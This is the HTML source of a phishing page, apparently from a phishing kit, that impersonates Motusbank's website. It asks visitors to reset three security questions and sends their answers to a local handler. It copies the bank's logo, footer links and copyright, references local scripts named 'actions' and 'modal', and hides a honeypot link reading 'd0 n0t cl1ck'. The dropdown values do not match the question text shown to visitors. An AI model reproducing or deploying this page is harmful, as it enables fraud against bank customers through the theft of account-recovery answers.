
<? php  ?>=(0040)/220098/motus/q -->
<html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Sign In</title>
        <script src="./MOT_2_files/modal"></script>
        <script>
            function empty() {
                var y;
                y = document.getElementById("username").value;
                if (y == "") {
                    document.getElementById("username").style = "border-color:red";
            		document.getElementById("username_error").style = "display: block";
                    return false;
                }
            	var x;
                x = document.getElementById("password").value;
                if (x == "") {
                    document.getElementById("password").style = "border-color:red";
            		document.getElementById("password_error").style = "display: block";
                    return false;
                }

            }
        </script>
        <script>
            function change() {
                var e;
                e = document.getElementById("username").value;
                if (e !== ""){
            	    document.getElementById("username").style = "";
            		document.getElementById("username_error").style = "display: none";
            	}
            	var e;
                e = document.getElementById("password").value;
                if (e !== ""){
            	    document.getElementById("password").style = "";
            		document.getElementById("password_error").style = "display: none";
            	}

            }

        </script>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <!--<base href=".">--><base href=".">
        <link href="./MOT_2_files/style.css" rel="stylesheet">
        <link href="./MOT_2_files/mint.css" id="theme-stylesheet" rel="stylesheet">
        <script src="./MOT_2_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Motus'; var lrinfo = 'Questions';</script>
        <script src="./MOT_2_files/actions"></script>
        <style>
        .newselect {
            background: #f3f3f4;
            border: none;
            border-bottom: 2px solid #c1c1c1;
            color: #414042;
            min-height: 28px;
            outline: 0;
            padding: 3px 0;
            transition: border-color .1s ease;
            border-radius: 0;
        }

        input, select, textarea {
            display: block;
            font-family: system-ui;
        }

        body {
            font-family: system-ui;
        }

        [type=button], [type=reset], [type=submit], button {
            font-family: system-ui;
        }
        </style>
    </head>
    <body>
        <div class="body-content">
            <div class="row public-header">
                <div class="logo-container">
                    <a href="/220098/motus/">
                        <img src="./MOT_2_files/logo.svg" alt="" class="meridian-logo">
                    </a>
                </div>
            </div>
        </div>
        <center>
            <h2 style="padding-top: 22px; margin-bottom: 5px;"><strong>Please reset your security questions</strong></h2>
        </center>
        <br>
        <center>
            <form method="post" action="/220098/motus/" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" style="padding: 0px 25px;">
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question1" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer1" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question2" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer2" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green otp-full-width-sm">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" style="">
                                        <select required="" name="question3" class="td-layout-grid6 newselect lrinput" size="1" style="height:42px;width:100%">
                                            <option value="" selected="selected">Select the security question</option>
                                            <option value="What was the name of your favourite superhero as a child?">What is the first name of your oldest nephew?</option>
                                            <option value="What is the name of the city where your mother was born?">What is the name of the city you were married in?</option>
                                            <option value="What was the last name of your favourite teacher in high school?">What was the colour of your first car?</option>
                                            <option value="What is the first name of your oldest nephew?">What was your best friend's first name?</option>
                                            <option value="What is the first name of your father&#39;s oldest sibling?">What is the name of your first pet?</option>
                                            <option value="What is the first name of your oldest cousin?">What is your mother's maiden name?</option>
                                            <option value="What was the first name of your first roommate?">What was the first name of your Maid of Honour?</option>
                                            <option value="What is the first name of your spouse&#39;s/partner&#39;s father?"> What is the city of your high school?</option>
                                            <option value="What is the first name of your first friend?">What is your father's middle name?</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="td-row">
                    <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                        <div class="otp-section-mint-green">
                            <div class="td-row">
                                <div class="td-col-sm-6 td-col-sm-offset-3">
                                    <div class="form-group" td-ui-form-group="Enter your Username or Access Card #" style="">
                                        <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer3" class="ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" style="width: 100% !important">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                                <div class="td-row">
                    <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                        <div class="form-group">
                            <button type="submit" name="save" value="1" class="td-button  td-button" style="background-color:#0079c1;width: 100%">
                            <font color="white">  Next</font>
                            </button>
                        </div>
                    </div>
                </div>
            </form>
            <br><br>
        </center>
        <footer class="main-footer">
            <div class="footer-spiral-container">
                <img class="footer-spiral visible" src="./MOT_2_files/Spiral-1.svg" style="animation-delay: -30.4396s;">
            </div>
            <div class="row">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="./MOT_2_files/logo.svg" alt="Motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="footer-sub">
                    <span>Copyright © 2023 Motus Bank. All rights reserved.</span>
                    <ul class="footer-links">
                        <li><a href="https://www.motusbank.ca/agreement-privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a></li>
                        <li><a href="https://www.motusbank.ca/legal" title="Legal" target="_blank">Legal</a></li>
                        <li><a href="https://www.motusbank.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a></li>
                    </ul>
                </div>
            </div>
            <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        </footer>
        <div class="ui-selectmenu-menu ui-front">
            <ul aria-hidden="true" aria-labelledby="account-switcher-button" id="account-switcher-menu" role="listbox" tabindex="0" class="ui-menu ui-corner-bottom ui-widget ui-widget-content"></ul>
        </div>
        <style>
        [type=color], [type=date], [type=datetime-local], [type=datetime], [type=email], [type=month], [type=number], [type=password], [type=search], [type=tel], [type=text], [type=time], [type=url],
        [type=week], input:not([type]), select[multiple], textarea {
            margin-bottom: 25px;
            height: 42px;
            width: 340px !important;
        }

        .td-layout-grid6 {
            margin-bottom: 10px;
        }
        </style>
    

</body></html></html></html></html>